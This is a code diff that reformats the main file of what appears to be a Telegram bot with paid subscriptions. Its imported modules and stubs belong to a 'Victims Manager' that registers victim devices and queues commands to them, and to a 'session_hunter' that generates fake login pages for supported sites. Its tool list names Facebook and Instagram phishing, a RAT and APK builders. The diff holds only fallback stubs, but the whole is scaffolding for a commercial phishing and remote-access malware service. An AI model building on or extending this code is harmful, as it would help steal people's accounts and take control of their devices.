@@ -50,7 +50,7 @@ except Exception as e:
 # LSH
 # ============================================================
 try:
-    from lsh_module import (
+    from lsh import (
         init_lsh_routes, lsh_bp,
         generate_qr_code_bytes as lsh_generate_qr,
         set_bot_reference,
@@ -59,15 +59,31 @@ try:
         build_lsh_control_panel,
     )
     LSH_ENABLED = True
+    print("[+] lsh imported")
 except Exception as e:
-    print(f"[-] lsh_module: {e}")
+    print(f"[-] lsh: {e}")
+    import traceback
+    traceback.print_exc()
     LSH_ENABLED = False
-    def init_lsh_routes(app, bot): pass
-    def set_bot_reference(bot): pass
-    def lsh_push_command(*a, **kw): return False
-    def lsh_get_session(*a, **kw): return None
-    def lsh_generate_qr(*a, **kw): return io.BytesIO()
-    def build_lsh_control_panel(*a, **kw): return InlineKeyboardMarkup()
+
+    def init_lsh_routes(app, bot):
+        pass
+
+    def set_bot_reference(bot):
+        pass
+
+    def lsh_push_command(*a, **kw):
+        return False
+
+    def lsh_get_session(*a, **kw):
+        return None
+
+    def lsh_generate_qr(*a, **kw):
+        return io.BytesIO()
+
+    def build_lsh_control_panel(*a, **kw):
+        return InlineKeyboardMarkup()
+
     lsh_bp = None
 
 # ============================================================
@@ -85,16 +101,28 @@ try:
 except Exception as e:
     print(f"[-] session_hunter: {e}")
     SH_ENABLED = False
-    def init_session_hunter_routes(app, bot): pass
+
+    def init_session_hunter_routes(app, bot):
+        pass
+
     sh_bp = None
-    def get_sh_data(sid): return {}
-    def build_sh_panel(sid, cid): return InlineKeyboardMarkup()
+
+    def get_sh_data(sid):
+        return {}
+
+    def build_sh_panel(sid, cid):
+        return InlineKeyboardMarkup()
+
     SUPPORTED_SITES = {}
-    def sh_create_session(*a, **kw): return None
-    def sh_generate_login_page(*a, **kw): return "Error"
+
+    def sh_create_session(*a, **kw):
+        return None
+
+    def sh_generate_login_page(*a, **kw):
+        return "Error"
 
 # ============================================================
-# ★★★ Victims Manager ★★★
+# Victims Manager
 # ============================================================
 try:
     from victims_manager import (
@@ -103,8 +131,7 @@ try:
         find_victim_by_token, register_victim_device,
         add_victim_data, get_victim_data,
         queue_victim_command, pop_victim_commands,
-        get_victim_stats,
-        has_victim_commands,  # ★ جديد
+        get_victim_stats, has_victim_commands,
     )
     VICTIMS_ENABLED = True
     print("[+] victims_manager imported")
@@ -113,20 +140,48 @@ except Exception as e:
     import traceback
     traceback.print_exc()
     VICTIMS_ENABLED = False
-    def create_victim(*a, **kw): return None
-    def get_victim(*a, **kw): return None
-    def get_all_victims(*a, **kw): return []
-    def delete_victim(*a, **kw): return False
-    def update_victim_status(*a, **kw): return False
-    def rename_victim(*a, **kw): return False
-    def find_victim_by_token(*a, **kw): return None
-    def register_victim_device(*a, **kw): return False
-    def add_victim_data(*a, **kw): return False
-    def get_victim_data(*a, **kw): return []
-    def queue_victim_command(*a, **kw): return False
-    def pop_victim_commands(*a, **kw): return []
-    def get_victim_stats(*a, **kw): return {}
-    def has_victim_commands(*a, **kw): return False  # ★ جديد
+
+    def create_victim(*a, **kw):
+        return None
+
+    def get_victim(*a, **kw):
+        return None
+
+    def get_all_victims(*a, **kw):
+        return []
+
+    def delete_victim(*a, **kw):
+        return False
+
+    def update_victim_status(*a, **kw):
+        return False
+
+    def rename_victim(*a, **kw):
+        return False
+
+    def find_victim_by_token(*a, **kw):
+        return None
+
+    def register_victim_device(*a, **kw):
+        return False
+
+    def add_victim_data(*a, **kw):
+        return False
+
+    def get_victim_data(*a, **kw):
+        return []
+
+    def queue_victim_command(*a, **kw):
+        return False
+
+    def pop_victim_commands(*a, **kw):
+        return []
+
+    def get_victim_stats(*a, **kw):
+        return {}
+
+    def has_victim_commands(*a, **kw):
+        return False
 
 # ============================================================
 # Stars Payment
@@ -148,31 +203,79 @@ try:
 except Exception as e:
     print(f"[-] stars_payment: {e}")
     PAYMENT_ENABLED = False
-    def register_payment_handlers(bot): pass
-    def get_or_create_user(*a, **kw): return {}
-    def can_use_tool(*a, **kw): return {"allowed": True, "reason": "bypass"}
-    def consume_usage(*a, **kw): return True
-    def build_plans_keyboard(): return InlineKeyboardMarkup()
-    def build_main_payment_keyboard(): return InlineKeyboardMarkup()
-    def build_account_text(*a, **kw): return "نظام الدفع معطّل"
-    def build_plans_text(): return "نظام الدفع معطّل"
-    def send_invoice(*a, **kw): pass
+
+    def register_payment_handlers(bot):
+        pass
+
+    def get_or_create_user(*a, **kw):
+        return {}
+
+    def can_use_tool(*a, **kw):
+        return {"allowed": True, "reason": "bypass"}
+
+    def consume_usage(*a, **kw):
+        return True
+
+    def build_plans_keyboard():
+        return InlineKeyboardMarkup()
+
+    def build_main_payment_keyboard():
+        return InlineKeyboardMarkup()
+
+    def build_account_text(*a, **kw):
+        return "نظام الدفع معطّل"
+
+    def build_plans_text():
+        return "نظام الدفع معطّل"
+
+    def send_invoice(*a, **kw):
+        pass
+
     PRICING_PLANS = {}
     FREE_TRIAL_USES = 3
     AVAILABLE_TOOLS = ["fb", "ig", "qr", "rat", "lsh", "sh", "apk"]
-    def is_admin(uid): return False
-    def is_vip(uid): return False
-    def get_all_users(): return []
-    def get_user(uid): return None
-    def save_user(uid, u): return False
-    def delete_user(uid): return False
-    def ban_user(uid): return False
-    def unban_user(uid): return False
-    def activate_subscription(uid, pk): return {}
-    def build_admin_menu(): return InlineKeyboardMarkup()
-    def build_admin_users_keyboard(*a, **kw): return InlineKeyboardMarkup()
-    def build_user_detail_keyboard(*a, **kw): return InlineKeyboardMarkup()
-    def build_user_info_text(*a, **kw): return ""
-    def build_admin_stats_text(): return ""
+
+    def is_admin(uid):
+        return False
+
+    def is_vip(uid):
+        return False
+
+    def get_all_users():
+        return []
+
+    def get_user(uid):
+        return None
+
+    def save_user(uid, u):
+        return False
+
+    def delete_user(uid):
+        return False
+
+    def ban_user(uid):
+        return False
+
+    def unban_user(uid):
+        return False
+
+    def activate_subscription(uid, pk):
+        return {}
+
+    def build_admin_menu():
+        return InlineKeyboardMarkup()
+
+    def build_admin_users_keyboard(*a, **kw):
+        return InlineKeyboardMarkup()
+
+    def build_user_detail_keyboard(*a, **kw):
+        return InlineKeyboardMarkup()
+
+    def build_user_info_text(*a, **kw):
+        return ""
+
+    def build_admin_stats_text():
+        return ""
+
     ADMIN_IDS = []
     VIP_IDS = []
